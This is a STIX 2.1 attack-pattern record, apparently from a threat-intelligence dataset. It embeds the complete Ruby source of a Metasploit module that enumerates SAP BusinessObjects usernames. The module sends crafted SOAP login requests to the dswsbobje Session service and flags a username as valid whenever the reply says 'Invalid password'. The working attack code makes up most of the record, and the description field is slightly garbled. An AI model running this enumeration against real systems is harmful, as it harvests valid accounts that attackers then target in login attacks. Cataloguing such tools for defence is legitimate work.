{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--66e4c931-a042-4008-9b69-f21e0e96a029",
    "created": "2024-08-14T16:30:24.545187Z",
    "modified": "2024-08-14T16:30:24.545191Z",
    "name": "SAP BusinessObjects User Enumeration",
    "description": "Q This module simply attempts to enumerate SAP BusinessObjects users. The dswsbobje interface is only used to verify valid users for CmcApp. Therefore, any valid users that have been identified can be leveraged by logging into CmcApp.  'References'  => [ # General",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/sap_businessobjects_user_enum.rb",
            "external_id": "sap_businessobjects_user_enum.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'\t\t   => 'SAP BusinessObjects User Enumeration',\n      'Description'\t=> %Q{\n        This module simply attempts to enumerate SAP BusinessObjects\n        users. The dswsbobje interface is only used to verify valid\n        users for CmcApp. Therefore, any valid users that have been\n        identified can be leveraged by logging into CmcApp.\n        },\n      'References'  =>\n        [\n          # General\n          [ 'URL', 'http://spl0it.org/files/talks/source_barcelona10/Hacking%20SAP%20BusinessObjects.pdf' ]\n        ],\n      'Author'\t\t => [ 'Joshua Abraham <jabra[at]rapid7.com>' ],\n      'License'\t\t=> MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('URI', [false, 'Path to the SAP BusinessObjects Axis2', '/dswsbobje']),\n      ])\n    register_autofilter_ports([ 8080 ])\n  end\n\n  def run_host(ip)\n    res = send_request_cgi({\n      'uri'    => normalize_uri(datastore['URI'], \"/services/listServices\"),\n      'method' => 'GET'\n    }, 25)\n    return if not res\n\n    each_user_pass { |user, pass|\n      enum_user(user)\n    }\n  end\n\n  def enum_user(user='administrator', pass='invalid-sap-password-0d03b389-b7a1-4ecc-8898-e62d1836b72a')\n    vprint_status(\"#{rhost}:#{rport} - Enumerating username:'#{user}'\")\n    success = false\n    soapenv='http://schemas.xmlsoap.org/soap/envelope/'\n    xmlns='http://session.dsws.businessobjects.com/2007/06/01'\n    xsi='http://www.w3.org/2001/XMLSchema-instance'\n\n    data = '<?xml version=\"1.0\" encoding=\"utf-8\"?>' + \"\\r\\n\"\n    data << '<soapenv:Envelope xmlns:soapenv=\"' +  soapenv + '\" xmlns:ns=\"' + xmlns + '\">' + \"\\r\\n\"\n    data << '<soapenv:Body>' + \"\\r\\n\"\n    data << '<login xmlns=\"' + xmlns + '\">' + \"\\r\\n\"\n    data << '<credential xmlns=\"' + xmlns + '\" xmlns:ns=\"' + xmlns + '\" xmlns:xsi=\"' + xsi + '\" Login=\"' + user  + '\" Password=\"' + pass + '\" xsi:type=\"ns:EnterpriseCredential\" />' + \"\\r\\n\"\n    data << '</login>' + \"\\r\\n\"\n    data << '</soapenv:Body>' + \"\\r\\n\"\n    data << '</soapenv:Envelope>' + \"\\r\\n\\r\\n\"\n\n    begin\n      res = send_request_raw({\n        'uri'     => normalize_uri(datastore['URI']) + \"/services/Session\",\n        'method'  => 'POST',\n        'data'    => data,\n        'headers' =>\n          {\n            'Content-Length' => data.length,\n            'SOAPAction'\t=> '\"' + 'http://session.dsws.businessobjects.com/2007/06/01/login' + '\"',\n            'Content-Type'  => 'text/xml; charset=UTF-8',\n          }\n      }, 45)\n\n      if res\n        return :abort if (!res or (res and res.code == 404))\n        success = true if(res and res.body.match(/Invalid password/i))\n        success\n      else\n        vprint_error(\"[SAP BusinessObjects] No response\")\n        return :abort\n      end\n\n    rescue ::Rex::ConnectionError\n      vprint_error(\"[SAP BusinessObjects] Unable to attempt authentication\")\n      return :abort\n    end\n\n    if success\n      print_good(\"[SAP BusinessObjects] Found valid username : '#{user}'\")\n      return :next_user\n    else\n      return\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[ Joshua Abraham <jabra[at]rapid7.com> ]",
        ""
    ]
}